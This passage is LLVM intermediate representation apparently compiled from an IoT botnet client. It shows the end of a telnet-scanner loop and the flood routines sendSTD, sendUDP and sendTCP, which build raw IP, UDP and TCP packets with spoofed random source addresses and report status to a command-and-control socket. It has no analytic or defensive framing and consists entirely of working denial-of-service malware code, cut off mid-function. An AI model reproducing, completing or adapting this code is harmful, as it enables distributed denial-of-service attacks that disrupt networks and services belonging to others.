  call void @llvm.memset.p0i8.i64(i8* %2208, i8 0, i64 1024, i32 1, i1 false)
  %2209 = load i32, i32* %2, align 4
  %2210 = sext i32 %2209 to i64
  %2211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2210
  %2212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2211, i32 0, i32 0
  %2213 = load i32, i32* %2212, align 16
  %2214 = call i32 @sclose(i32 %2213)
  %2215 = load i32, i32* %2, align 4
  %2216 = sext i32 %2215 to i64
  %2217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2216
  %2218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2217, i32 0, i32 3
  store i8 1, i8* %2218, align 1
  %2219 = load i32, i32* %2, align 4
  %2220 = sext i32 %2219 to i64
  %2221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2220
  %2222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2221, i32 0, i32 2
  store i8 0, i8* %2222, align 8
  br label %2264

; <label>:2223:                                   ; preds = %2144
  %2224 = load i32, i32* %2, align 4
  %2225 = sext i32 %2224 to i64
  %2226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2225
  %2227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2226, i32 0, i32 8
  %2228 = load i8*, i8** %2227, align 8
  %2229 = call i64 @strlen(i8* %2228) #10
  %2230 = trunc i64 %2229 to i16
  %2231 = load i32, i32* %2, align 4
  %2232 = sext i32 %2231 to i64
  %2233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2232
  %2234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2233, i32 0, i32 7
  store i16 %2230, i16* %2234, align 16
  br label %2235

; <label>:2235:                                   ; preds = %2223
  br label %2236

; <label>:2236:                                   ; preds = %2235
  br label %2237

; <label>:2237:                                   ; preds = %2236
  %2238 = load i32, i32* %2, align 4
  %2239 = sext i32 %2238 to i64
  %2240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2239
  %2241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2240, i32 0, i32 6
  %2242 = load i32, i32* %2241, align 4
  %2243 = add i32 %2242, 10
  %2244 = zext i32 %2243 to i64
  %2245 = call i64 @time(i64* null) #2
  %2246 = icmp slt i64 %2244, %2245
  br i1 %2246, label %2247, label %2262

; <label>:2247:                                   ; preds = %2237
  %2248 = load i32, i32* %2, align 4
  %2249 = sext i32 %2248 to i64
  %2250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2249
  %2251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2250, i32 0, i32 0
  %2252 = load i32, i32* %2251, align 16
  %2253 = call i32 @sclose(i32 %2252)
  %2254 = load i32, i32* %2, align 4
  %2255 = sext i32 %2254 to i64
  %2256 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2255
  %2257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2256, i32 0, i32 2
  store i8 0, i8* %2257, align 8
  %2258 = load i32, i32* %2, align 4
  %2259 = sext i32 %2258 to i64
  %2260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2259
  %2261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2260, i32 0, i32 3
  store i8 1, i8* %2261, align 1
  br label %2262

; <label>:2262:                                   ; preds = %2247, %2237
  br label %2263

; <label>:2263:                                   ; preds = %2262, %1979, %1951, %1923, %1899, %1193, %1129, %764, %700, %389, %231, %68
  br label %2264

; <label>:2264:                                   ; preds = %2263, %2163, %2103, %2043, %1964, %1936, %1908, %1856, %1831, %1790, %1765, %1724, %1699, %1658, %1633, %1592, %1567, %1526, %1501, %1460, %1435, %1394, %1369, %1341, %1300, %1275, %1247, %1178, %1155, %1077, %1054, %1031, %1008, %985, %962, %939, %916, %893, %879, %828, %749, %726, %654, %603, %552, %501, %450, %313, %184, %140
  %2265 = load i32, i32* %2, align 4
  %2266 = add nsw i32 %2265, 1
  store i32 %2266, i32* %2, align 4
  br label %64

; <label>:2267:                                   ; preds = %64
  br label %62
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #2
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #2
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  br label %36

; <label>:36:                                     ; preds = %55, %3
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  br i1 %38, label %39, label %55

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %7, align 4
  %41 = call i64 @send(i32 %40, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0), i64 50, i32 0)
  %42 = load i32, i32* %7, align 4
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = call i32 @connect(i32 %42, %struct.sockaddr* %43, i32 16)
  %45 = call i64 @time(i64* null) #2
  %46 = load i64, i64* %8, align 8
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = add nsw i64 %46, %48
  %50 = icmp sge i64 %45, %49
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %39
  %52 = load i32, i32* %7, align 4
  %53 = call i32 @close(i32 %52)
  call void @_exit(i32 0) #12
  unreachable

; <label>:54:                                     ; preds = %39
  store i32 0, i32* %11, align 4
  br label %55

; <label>:55:                                     ; preds = %54, %36
  %56 = load i32, i32* %11, align 4
  %57 = add i32 %56, 1
  store i32 %57, i32* %11, align 4
  br label %36
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %277

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %107

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %277

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add nsw i32 %60, 1
  %62 = sext i32 %61 to i64
  %63 = call noalias i8* @malloc(i64 %62) #2
  store i8* %63, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = icmp eq i8* %64, null
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %59
  br label %277

; <label>:67:                                     ; preds = %59
  %68 = load i8*, i8** %16, align 8
  %69 = load i32, i32* %11, align 4
  %70 = add nsw i32 %69, 1
  %71 = sext i32 %70 to i64
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 %71, i32 1, i1 false)
  %72 = load i8*, i8** %16, align 8
  %73 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %72, i32 %73)
  %74 = call i64 @time(i64* null) #2
  %75 = load i32, i32* %9, align 4
  %76 = sext i32 %75 to i64
  %77 = add nsw i64 %74, %76
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %103, %102, %67
  %80 = load i32, i32* %15, align 4
  %81 = load i8*, i8** %16, align 8
  %82 = load i32, i32* %11, align 4
  %83 = sext i32 %82 to i64
  %84 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %85 = call i64 @sendto(i32 %80, i8* %81, i64 %83, i32 0, %struct.sockaddr* %84, i32 16)
  %86 = load i32, i32* %18, align 4
  %87 = load i32, i32* %14, align 4
  %88 = icmp eq i32 %86, %87
  br i1 %88, label %89, label %103

; <label>:89:                                     ; preds = %79
  %90 = load i32, i32* %8, align 4
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %96

; <label>:92:                                     ; preds = %89
  %93 = call i32 @rand_cmwc()
  %94 = trunc i32 %93 to i16
  %95 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %94, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %92, %89
  %97 = call i64 @time(i64* null) #2
  %98 = load i32, i32* %17, align 4
  %99 = sext i32 %98 to i64
  %100 = icmp sgt i64 %97, %99
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %96
  br label %106

; <label>:102:                                    ; preds = %96
  store i32 0, i32* %18, align 4
  br label %79

; <label>:103:                                    ; preds = %79
  %104 = load i32, i32* %18, align 4
  %105 = add i32 %104, 1
  store i32 %105, i32* %18, align 4
  br label %79

; <label>:106:                                    ; preds = %101
  br label %277

; <label>:107:                                    ; preds = %46
  %108 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %108, i32* %19, align 4
  %109 = load i32, i32* %19, align 4
  %110 = icmp ne i32 %109, 0
  br i1 %110, label %114, label %111

; <label>:111:                                    ; preds = %107
  %112 = load i32, i32* @mainCommSock, align 4
  %113 = call i32 (i32, i8*, ...) @sockprintf(i32 %112, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %277

; <label>:114:                                    ; preds = %107
  store i32 1, i32* %20, align 4
  %115 = load i32, i32* %19, align 4
  %116 = bitcast i32* %20 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #2
  %118 = icmp slt i32 %117, 0
  br i1 %118, label %119, label %122

; <label>:119:                                    ; preds = %114
  %120 = load i32, i32* @mainCommSock, align 4
  %121 = call i32 (i32, i8*, ...) @sockprintf(i32 %120, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  br label %277

; <label>:122:                                    ; preds = %114
  store i32 50, i32* %21, align 4
  br label %123

; <label>:123:                                    ; preds = %127, %122
  %124 = load i32, i32* %21, align 4
  %125 = add nsw i32 %124, -1
  store i32 %125, i32* %21, align 4
  %126 = icmp ne i32 %124, 0
  br i1 %126, label %127, label %134

; <label>:127:                                    ; preds = %123
  %128 = call i64 @time(i64* null) #2
  %129 = call i32 @rand_cmwc()
  %130 = zext i32 %129 to i64
  %131 = xor i64 %128, %130
  %132 = trunc i64 %131 to i32
  call void @srand(i32 %132) #2
  %133 = call i32 @rand() #2
  call void @init_rand(i32 %133)
  br label %123

; <label>:134:                                    ; preds = %123
  %135 = load i32, i32* %10, align 4
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %138

; <label>:137:                                    ; preds = %134
  store i32 0, i32* %22, align 4
  br label %144

; <label>:138:                                    ; preds = %134
  %139 = load i32, i32* %10, align 4
  %140 = sub nsw i32 32, %139
  %141 = shl i32 1, %140
  %142 = sub nsw i32 %141, 1
  %143 = xor i32 %142, -1
  store i32 %143, i32* %22, align 4
  br label %144

; <label>:144:                                    ; preds = %138, %137
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = add i64 28, %146
  %148 = call i8* @llvm.stacksave()
  store i8* %148, i8** %23, align 8
  %149 = alloca i8, i64 %147, align 16
  %150 = bitcast i8* %149 to %struct.iphdr*
  store %struct.iphdr* %150, %struct.iphdr** %24, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %152 = bitcast %struct.iphdr* %151 to i8*
  %153 = getelementptr i8, i8* %152, i64 20
  %154 = bitcast i8* %153 to %struct.udphdr*
  store %struct.udphdr* %154, %struct.udphdr** %25, align 8
  %155 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %156 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %157 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 4
  %159 = load i32, i32* %22, align 4
  %160 = call i32 @getRandomIP(i32 %159)
  %161 = call i32 @htonl(i32 %160) #13
  %162 = load i32, i32* %11, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 8, %163
  %165 = trunc i64 %164 to i32
  call void @makeIPPacket(%struct.iphdr* %155, i32 %158, i32 %161, i8 zeroext 17, i32 %165)
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = add i64 8, %167
  %169 = trunc i64 %168 to i16
  %170 = call zeroext i16 @htons(i16 zeroext %169) #13
  %171 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %172 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %171, i32 0, i32 0
  %173 = bitcast %union.anon.3* %172 to %struct.anon.4*
  %174 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %173, i32 0, i32 2
  store i16 %170, i16* %174, align 2
  %175 = call i32 @rand_cmwc()
  %176 = trunc i32 %175 to i16
  %177 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %178 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %177, i32 0, i32 0
  %179 = bitcast %union.anon.3* %178 to %struct.anon.4*
  %180 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %179, i32 0, i32 0
  store i16 %176, i16* %180, align 2
  %181 = load i32, i32* %8, align 4
  %182 = icmp eq i32 %181, 0
  br i1 %182, label %183, label %185

; <label>:183:                                    ; preds = %144
  %184 = call i32 @rand_cmwc()
  br label %190

; <label>:185:                                    ; preds = %144
  %186 = load i32, i32* %8, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #13
  %189 = zext i16 %188 to i32
  br label %190

; <label>:190:                                    ; preds = %185, %183
  %191 = phi i32 [ %184, %183 ], [ %189, %185 ]
  %192 = trunc i32 %191 to i16
  %193 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 0
  %195 = bitcast %union.anon.3* %194 to %struct.anon.4*
  %196 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %195, i32 0, i32 1
  store i16 %192, i16* %196, align 2
  %197 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %198 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %197, i32 0, i32 0
  %199 = bitcast %union.anon.3* %198 to %struct.anon.4*
  %200 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %199, i32 0, i32 3
  store i16 0, i16* %200, align 2
  %201 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %202 = bitcast %struct.udphdr* %201 to i8*
  %203 = getelementptr inbounds i8, i8* %202, i64 8
  %204 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %203, i32 %204)
  %205 = bitcast i8* %149 to i16*
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 2
  %208 = load i16, i16* %207, align 2
  %209 = zext i16 %208 to i32
  %210 = call zeroext i16 @csum(i16* %205, i32 %209)
  %211 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 7
  store i16 %210, i16* %212, align 2
  %213 = call i64 @time(i64* null) #2
  %214 = load i32, i32* %9, align 4
  %215 = sext i32 %214 to i64
  %216 = add nsw i64 %213, %215
  %217 = trunc i64 %216 to i32
  store i32 %217, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %218

; <label>:218:                                    ; preds = %272, %271, %190
  br label %219

; <label>:219:                                    ; preds = %218
  %220 = load i32, i32* %19, align 4
  %221 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %222 = call i64 @sendto(i32 %220, i8* %149, i64 %147, i32 0, %struct.sockaddr* %221, i32 16)
  %223 = call i32 @rand_cmwc()
  %224 = trunc i32 %223 to i16
  %225 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %226 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %225, i32 0, i32 0
  %227 = bitcast %union.anon.3* %226 to %struct.anon.4*
  %228 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %227, i32 0, i32 0
  store i16 %224, i16* %228, align 2
  %229 = load i32, i32* %8, align 4
  %230 = icmp eq i32 %229, 0
  br i1 %230, label %231, label %233

; <label>:231:                                    ; preds = %219
  %232 = call i32 @rand_cmwc()
  br label %238

; <label>:233:                                    ; preds = %219
  %234 = load i32, i32* %8, align 4
  %235 = trunc i32 %234 to i16
  %236 = call zeroext i16 @htons(i16 zeroext %235) #13
  %237 = zext i16 %236 to i32
  br label %238

; <label>:238:                                    ; preds = %233, %231
  %239 = phi i32 [ %232, %231 ], [ %237, %233 ]
  %240 = trunc i32 %239 to i16
  %241 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %242 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %241, i32 0, i32 0
  %243 = bitcast %union.anon.3* %242 to %struct.anon.4*
  %244 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %243, i32 0, i32 1
  store i16 %240, i16* %244, align 2
  %245 = call i32 @rand_cmwc()
  %246 = trunc i32 %245 to i16
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 3
  store i16 %246, i16* %248, align 4
  %249 = load i32, i32* %22, align 4
  %250 = call i32 @getRandomIP(i32 %249)
  %251 = call i32 @htonl(i32 %250) #13
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 8
  store i32 %251, i32* %253, align 4
  %254 = bitcast i8* %149 to i16*
  %255 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 2
  %257 = load i16, i16* %256, align 2
  %258 = zext i16 %257 to i32
  %259 = call zeroext i16 @csum(i16* %254, i32 %258)
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 7
  store i16 %259, i16* %261, align 2
  %262 = load i32, i32* %27, align 4
  %263 = load i32, i32* %14, align 4
  %264 = icmp eq i32 %262, %263
  br i1 %264, label %265, label %272

; <label>:265:                                    ; preds = %238
  %266 = call i64 @time(i64* null) #2
  %267 = load i32, i32* %26, align 4
  %268 = sext i32 %267 to i64
  %269 = icmp sgt i64 %266, %268
  br i1 %269, label %270, label %271

; <label>:270:                                    ; preds = %265
  br label %275

; <label>:271:                                    ; preds = %265
  store i32 0, i32* %27, align 4
  br label %218

; <label>:272:                                    ; preds = %238
  %273 = load i32, i32* %27, align 4
  %274 = add i32 %273, 1
  store i32 %274, i32* %27, align 4
  br label %218

; <label>:275:                                    ; preds = %270
  %276 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %276)
  br label %277

; <label>:277:                                    ; preds = %275, %119, %111, %106, %66, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %342

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %342

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #2
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  br label %342

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 32, %67
  %69 = shl i32 1, %68
  %70 = sub nsw i32 %69, 1
  %71 = xor i32 %70, -1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %66, %65
  %73 = load i32, i32* %13, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 40, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %20, align 8
  %77 = alloca i8, i64 %75, align 16
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.tcphdr*
  store %struct.tcphdr* %82, %struct.tcphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %19, align 4
  %88 = call i32 @getRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #13
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 20, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 6, i32 %93)
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon.0* %97 to %struct.anon.1*
  %99 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %98, i32 0, i32 0
  store i16 %95, i16* %99, align 4
  %100 = call i32 @rand_cmwc()
